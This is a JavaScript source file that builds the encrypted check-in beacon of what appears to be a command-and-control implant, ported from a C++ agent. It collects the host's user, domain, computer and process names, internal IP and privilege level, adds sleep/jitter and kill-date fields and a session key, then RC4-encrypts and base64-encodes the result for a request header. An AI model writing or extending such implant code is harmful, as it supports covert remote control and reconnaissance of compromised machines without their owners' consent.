// beat.js — registration/tick beat per Agent::BuildBeat (Agent.cpp).
// beatPlain (BE): agent_type | agent_id | sleep | jitter | kill | working |
//   acp16 | oemcp16 | gmt8 | pid16 | tid16 | build32 | major8 | minor8 |
//   internal_ip32 | flag8 | PackBytes(sessionKey16) | PackStringA(domain,computer,user,process)
// on the wire: base64( RC4(encrypt_key, beatPlain) ) in the hb header.
const crypto = require('crypto');
const { Packer } = require('./packer');
const { rc4 } = require('./rc4');

function buildFlag(info) {
  // C++: flag += is_server; <<=1; += elevated; <<=1; += sys64; <<=1; += arch64
  let f = 0;
  f = ((f + (info.is_server ? 1 : 0)) << 1) + (info.elevated ? 1 : 0);
  f = ((f << 1) + (info.sys64 ? 1 : 0));
  f = ((f << 1) + (info.arch64 ? 1 : 0));
  return f & 0xff;
}

function swap32(v) {
  v = v >>> 0;
  // C++ stores inet_addr() (network order) in a host LE ULONG and Pack32's it
  // BE — on the wire the octets are reversed. Match it or the server console
  // shows the IP backwards.
  return (((v & 0xff) << 24) | ((v & 0xff00) << 8) | ((v >>> 8) & 0xff00) | ((v >>> 24) & 0xff)) >>> 0;
}

function buildBeat(cfg, info, fixedKey) {
  const key = Buffer.from(cfg.encrypt_key, 'hex');
  const sessionKey = fixedKey || crypto.randomBytes(16);

  const p = new Packer();
  p.u32(cfg.agent_type >>> 0)
   .u32(cfg.agent_id >>> 0)
   .u32(cfg.sleep_delay >>> 0)
   .u32(cfg.jitter_delay >>> 0)
   .u32(0)                       // kill_date
   .u32(0)                       // working_time
   .u16(info.acp & 0xffff).u16(info.oemcp & 0xffff)
   .u8((info.gmt_offset | 0) & 0xff)
   .u16((info.pid || 0) & 0xffff).u16((info.tid || 0) & 0xffff)
   .u32((info.build_number || 0) >>> 0)
   .u8(info.major_version & 0xff).u8(info.minor_version & 0xff)
   .u32(swap32(info.internal_ip >>> 0))
   .u8(buildFlag(info))
   .bytes(sessionKey, 16)
   .str(info.domain_name).str(info.computer_name)
   .str(info.username).str(info.process_name);

  const plain = p.data();
  return { headerValue: rc4(plain, key).toString('base64'), sessionKey, plain };
}
module.exports = { buildBeat, buildFlag, swap32 };
